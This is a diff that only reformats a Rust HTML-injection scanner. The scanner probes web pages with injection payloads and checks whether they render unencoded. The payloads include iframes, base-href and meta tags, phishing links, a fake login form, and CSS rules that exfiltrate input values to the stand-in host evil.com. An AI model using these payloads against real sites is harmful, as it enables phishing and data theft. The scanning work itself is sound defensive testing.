@@ -38,35 +38,55 @@ impl HtmlInjectionScanner {
         tests_run += tests;
 
         // Test meta tag injection if no critical vulns found
-        if vulnerabilities.is_empty() || vulnerabilities.iter().all(|v| v.severity != Severity::Critical) {
+        if vulnerabilities.is_empty()
+            || vulnerabilities
+                .iter()
+                .all(|v| v.severity != Severity::Critical)
+        {
             let (vulns, tests) = self.test_meta_tag_injection(url).await?;
             vulnerabilities.extend(vulns);
             tests_run += tests;
         }
 
         // Test link manipulation
-        if vulnerabilities.is_empty() || vulnerabilities.iter().all(|v| v.severity != Severity::Critical) {
+        if vulnerabilities.is_empty()
+            || vulnerabilities
+                .iter()
+                .all(|v| v.severity != Severity::Critical)
+        {
             let (vulns, tests) = self.test_link_manipulation(url).await?;
             vulnerabilities.extend(vulns);
             tests_run += tests;
         }
 
         // Test form injection
-        if vulnerabilities.is_empty() || vulnerabilities.iter().all(|v| v.severity != Severity::Critical) {
+        if vulnerabilities.is_empty()
+            || vulnerabilities
+                .iter()
+                .all(|v| v.severity != Severity::Critical)
+        {
             let (vulns, tests) = self.test_form_injection(url).await?;
             vulnerabilities.extend(vulns);
             tests_run += tests;
         }
 
         // Test media injection
-        if vulnerabilities.is_empty() || vulnerabilities.iter().all(|v| v.severity != Severity::Critical) {
+        if vulnerabilities.is_empty()
+            || vulnerabilities
+                .iter()
+                .all(|v| v.severity != Severity::Critical)
+        {
             let (vulns, tests) = self.test_media_injection(url).await?;
             vulnerabilities.extend(vulns);
             tests_run += tests;
         }
 
         // Test style injection
-        if vulnerabilities.is_empty() || vulnerabilities.iter().all(|v| v.severity != Severity::Critical) {
+        if vulnerabilities.is_empty()
+            || vulnerabilities
+                .iter()
+                .all(|v| v.severity != Severity::Critical)
+        {
             let (vulns, tests) = self.test_style_injection(url).await?;
             vulnerabilities.extend(vulns);
             tests_run += tests;
@@ -76,7 +96,10 @@ impl HtmlInjectionScanner {
     }
 
     /// Test content injection (h1, marquee, iframe)
-    async fn test_content_injection(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
+    async fn test_content_injection(
+        &self,
+        url: &str,
+    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
         let mut vulnerabilities = Vec::new();
         let tests_run = 3;
 
@@ -85,7 +108,10 @@ impl HtmlInjectionScanner {
         let payloads = vec![
             format!("<h1>Injected_{}</h1>", self.test_marker),
             format!("<marquee>marquee_{}</marquee>", self.test_marker),
-            format!(r#"<iframe src="https://evil.com/track?id={}"></iframe>"#, self.test_marker),
+            format!(
+                r#"<iframe src="https://evil.com/track?id={}"></iframe>"#,
+                self.test_marker
+            ),
         ];
 
         for payload in payloads {
@@ -112,7 +138,10 @@ impl HtmlInjectionScanner {
                             "Content Injection",
                             &payload,
                             "HTML content injection detected",
-                            &format!("Injected HTML marker '{}' rendered without encoding", self.test_marker),
+                            &format!(
+                                "Injected HTML marker '{}' rendered without encoding",
+                                self.test_marker
+                            ),
                             severity,
                         ));
                         break;
@@ -128,7 +157,10 @@ impl HtmlInjectionScanner {
     }
 
     /// Test meta tag injection
-    async fn test_meta_tag_injection(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
+    async fn test_meta_tag_injection(
+        &self,
+        url: &str,
+    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
         let mut vulnerabilities = Vec::new();
         let tests_run = 4;
 
@@ -140,9 +172,15 @@ impl HtmlInjectionScanner {
             // Base href (critical - changes ALL relative URLs)
             format!(r#"<base href="https://evil.com/{}/">"#, self.test_marker),
             // Meta description (SEO poisoning)
-            format!(r#"<meta name="description" content="Injected_{}">"#, self.test_marker),
+            format!(
+                r#"<meta name="description" content="Injected_{}">"#,
+                self.test_marker
+            ),
             // Open Graph image (tracking)
-            format!(r#"<meta property="og:image" content="https://evil.com/track.png?id={}">"#, self.test_marker),
+            format!(
+                r#"<meta property="og:image" content="https://evil.com/track.png?id={}">"#,
+                self.test_marker
+            ),
         ];
 
         for payload in payloads {
@@ -157,7 +195,9 @@ impl HtmlInjectionScanner {
                     if self.detect_html_injection(&response.body, &payload) {
                         info!("Meta tag injection detected");
 
-                        let severity = if payload.contains("http-equiv=\"refresh\"") || payload.contains("<base") {
+                        let severity = if payload.contains("http-equiv=\"refresh\"")
+                            || payload.contains("<base")
+                        {
                             Severity::Critical
                         } else {
                             Severity::Medium
@@ -172,7 +212,10 @@ impl HtmlInjectionScanner {
                             } else {
                                 "Meta tag injection - SEO poisoning or tracking"
                             },
-                            &format!("Injected meta tag with marker '{}' rendered in page", self.test_marker),
+                            &format!(
+                                "Injected meta tag with marker '{}' rendered in page",
+                                self.test_marker
+                            ),
                             severity,
                         ));
                         break;
@@ -188,7 +231,10 @@ impl HtmlInjectionScanner {
     }
 
     /// Test link manipulation
-    async fn test_link_manipulation(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
+    async fn test_link_manipulation(
+        &self,
+        url: &str,
+    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
         let mut vulnerabilities = Vec::new();
         let tests_run = 3;
 
@@ -196,11 +242,20 @@ impl HtmlInjectionScanner {
 
         let payloads = vec![
             // Phishing link
-            format!(r#"<a href="https://evil.com/phish?id={}">Click here</a>"#, self.test_marker),
+            format!(
+                r#"<a href="https://evil.com/phish?id={}">Click here</a>"#,
+                self.test_marker
+            ),
             // CSS stylesheet link (data exfiltration via CSS)
-            format!(r#"<link rel="stylesheet" href="https://evil.com/steal.css?id={}">"#, self.test_marker),
+            format!(
+                r#"<link rel="stylesheet" href="https://evil.com/steal.css?id={}">"#,
+                self.test_marker
+            ),
             // Prefetch link (force browser to load external resource)
-            format!(r#"<link rel="prefetch" href="https://evil.com/track?id={}">"#, self.test_marker),
+            format!(
+                r#"<link rel="prefetch" href="https://evil.com/track?id={}">"#,
+                self.test_marker
+            ),
         ];
 
         for payload in payloads {
@@ -230,7 +285,10 @@ impl HtmlInjectionScanner {
                             } else {
                                 "Link injection - phishing risk"
                             },
-                            &format!("Injected link with marker '{}' rendered in page", self.test_marker),
+                            &format!(
+                                "Injected link with marker '{}' rendered in page",
+                                self.test_marker
+                            ),
                             severity,
                         ));
                         break;
@@ -267,8 +325,7 @@ impl HtmlInjectionScanner {
 <input type="hidden" name="token" value="injected_{}">
 <input type="submit" value="Continue">
 </form>"#,
-                self.test_marker,
-                self.test_marker
+                self.test_marker, self.test_marker
             ),
         ];
 
@@ -288,7 +345,10 @@ impl HtmlInjectionScanner {
                             "Form Injection",
                             &payload,
                             "Form injection - credential phishing risk",
-                            &format!("Injected form with marker '{}' rendered in page", self.test_marker),
+                            &format!(
+                                "Injected form with marker '{}' rendered in page",
+                                self.test_marker
+                            ),
                             Severity::Critical,
                         ));
                         break;
@@ -312,11 +372,20 @@ impl HtmlInjectionScanner {
 
         let payloads = vec![
             // Image with tracking
-            format!(r#"<img src="https://evil.com/track.png?user={}">"#, self.test_marker),
+            format!(
+                r#"<img src="https://evil.com/track.png?user={}">"#,
+                self.test_marker
+            ),
             // Video element
-            format!(r#"<video src="https://evil.com/video.mp4?id={}"></video>"#, self.test_marker),
+            format!(
+                r#"<video src="https://evil.com/video.mp4?id={}"></video>"#,
+                self.test_marker
+            ),
             // Audio element
-            format!(r#"<audio src="https://evil.com/track.ogg?id={}"></audio>"#, self.test_marker),
+            format!(
+                r#"<audio src="https://evil.com/track.ogg?id={}"></audio>"#,
+                self.test_marker
+            ),
         ];
 
         for payload in payloads {
@@ -335,7 +404,10 @@ impl HtmlInjectionScanner {
                             "Media Injection",
                             &payload,
                             "Media element injection - tracking and SSRF risk",
-                            &format!("Injected media element with marker '{}' rendered in page", self.test_marker),
+                            &format!(
+                                "Injected media element with marker '{}' rendered in page",
+                                self.test_marker
+                            ),
                             Severity::Medium,
                         ));
                         break;
@@ -359,14 +431,19 @@ impl HtmlInjectionScanner {
 
         let payloads = vec![
             // CSS with background image (data exfiltration)
-            format!(r#"<style>body{{background:url(https://evil.com/bg.png?data={})}}</style>"#, self.test_marker),
+            format!(
+                r#"<style>body{{background:url(https://evil.com/bg.png?data={})}}</style>"#,
+                self.test_marker
+            ),
             // CSS clickjacking
-            format!(r#"<style>.login-button{{opacity:0;position:absolute;z-index:-1}}/*{}*/</style>"#, self.test_marker),
+            format!(
+                r#"<style>.login-button{{opacity:0;position:absolute;z-index:-1}}/*{}*/</style>"#,
+                self.test_marker
+            ),
             // CSS attribute selector exfiltration
             format!(
                 r#"<style>input[value^="a"]{{background:url(https://evil.com/a?id={})}}/*{}*/</style>"#,
-                self.test_marker,
-                self.test_marker
+                self.test_marker, self.test_marker
             ),
         ];
 
@@ -393,7 +470,10 @@ impl HtmlInjectionScanner {
                             "Style Injection",
                             &payload,
                             "CSS injection - data exfiltration or UI manipulation risk",
-                            &format!("Injected style tag with marker '{}' rendered in page", self.test_marker),
+                            &format!(
+                                "Injected style tag with marker '{}' rendered in page",
+                                self.test_marker
+                            ),
                             severity,
                         ));
                         break;
@@ -441,9 +521,7 @@ impl HtmlInjectionScanner {
         // Encoded (safe): &lt;h1&gt; appears
         if body.contains(key_tag) {
             // Double-check it's not HTML entity encoded
-            let encoded_tag = key_tag
-                .replace('<', "&lt;")
-                .replace('>', "&gt;");
+            let encoded_tag = key_tag.replace('<', "&lt;").replace('>', "&gt;");
 
             // If we find the encoded version, it's NOT a vulnerability
             if body.contains(&encoded_tag) {
@@ -555,7 +633,7 @@ mod uuid {
 mod tests {
     use super::*;
     use crate::detection_helpers::AppCharacteristics;
-use crate::http_client::HttpClient;
+    use crate::http_client::HttpClient;
     use std::sync::Arc;
 
     fn create_test_scanner() -> HtmlInjectionScanner {
@@ -576,7 +654,10 @@ use crate::http_client::HttpClient;
     fn test_detect_html_injection_encoded() {
         let scanner = create_test_scanner();
         let payload = format!("<h1>Test_{}</h1>", scanner.test_marker);
-        let body = format!("Response: &lt;h1&gt;Test_{}&lt;/h1&gt;", scanner.test_marker);
+        let body = format!(
+            "Response: &lt;h1&gt;Test_{}&lt;/h1&gt;",
+            scanner.test_marker
+        );
 
         assert!(!scanner.detect_html_injection(&body, &payload));
     }
@@ -614,7 +695,10 @@ use crate::http_client::HttpClient;
     #[test]
     fn test_detect_style_injection() {
         let scanner = create_test_scanner();
-        let payload = format!(r#"<style>body{{background:red}}/*{}*/</style>"#, scanner.test_marker);
+        let payload = format!(
+            r#"<style>body{{background:red}}/*{}*/</style>"#,
+            scanner.test_marker
+        );
         let body = format!("HTML: {}", payload);
 
         assert!(scanner.detect_html_injection(&body, &payload));
@@ -637,7 +721,10 @@ use crate::http_client::HttpClient;
     #[test]
     fn test_detect_iframe_injection() {
         let scanner = create_test_scanner();
-        let payload = format!(r#"<iframe src="https://evil.com?id={}"></iframe>"#, scanner.test_marker);
+        let payload = format!(
+            r#"<iframe src="https://evil.com?id={}"></iframe>"#,
+            scanner.test_marker
+        );
         let body = format!("Content: {}", payload);
 
         assert!(scanner.detect_html_injection(&body, &payload));
